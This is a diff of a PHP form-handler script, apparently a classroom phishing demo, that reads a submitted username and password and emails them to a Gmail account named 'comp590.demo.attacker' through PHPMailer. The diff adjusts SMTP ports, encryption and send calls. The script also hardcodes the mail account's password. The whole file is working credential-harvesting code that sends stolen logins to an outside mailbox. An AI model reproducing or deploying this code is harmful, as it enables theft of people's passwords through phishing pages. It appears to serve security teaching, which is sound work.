@@ -1,6 +1,6 @@
 <?php
 
-use PHPMailer\PHPMailer\PHPMailer;
+require_once ('PHPMailer/PHPMailerAutoload.php');
 
 $email = "comp590.demo.attacker@gmail.com";
 
@@ -8,9 +8,9 @@ $email = "comp590.demo.attacker@gmail.com";
 //ini_set("smtp_port","465");
 //ini_set('sendmail_from', $email);
 
-//ini_set("SMTP","smtp.gmail.com");
-//ini_set("smtp_port","587");
-//ini_set('sendmail_from', $email);
+ini_set("SMTP","smtp.gmail.com");
+ini_set("smtp_port","25");
+ini_set('sendmail_from', $email);
 
 //ini_set("SMTP","tls://smtp.gmail.com");
 //ini_set("smtp_port","587");
@@ -18,16 +18,14 @@ $email = "comp590.demo.attacker@gmail.com";
 
 $mail = new PHPMailer();
 $mail->isSMTP();
-$mail->Mailer = "smtp";
-$mail->SMTPDebug = 1;
 $mail->SMTPAuth = true;
-$mail->SMTPSecure = "tls";
-$mail->Port = 587;
+$mail->SMTPSecure = "ssl";
 $mail->Host = "smtp.gmail.com";
+$mail->Port = '465';
+$mail->isHTML();
 $mail->Username = $email;
 $mail->Password = "comp590344";
 
-echo "action page navigated";
 if ( isset( $_REQUEST['submit'])) {
     echo "Form submitted";
     $username = $_REQUEST['name'];
@@ -35,15 +33,11 @@ if ( isset( $_REQUEST['submit'])) {
     
     $msg = "Username: $username \n Password: $password";
 
-    $mail->isHTML(true);
-    $mail->addAddress($email, $email);
-    $mail->setFrom($email, $email);
-    $mail->addReplyTo($email, $email);
+    $mail->SetFrom($email);
     $mail->Subject = "User details";
-    $mail->msgHTML($msg);
-    $mail->send();
-//    mail($email, "User details", $msg);
+    $mail->Body = $msg;
+    $mail->AddAddress($email);
 
-//} else {
-//    mail($email, "Test email", "Testing.");
+    $mail->Send();
+
 }
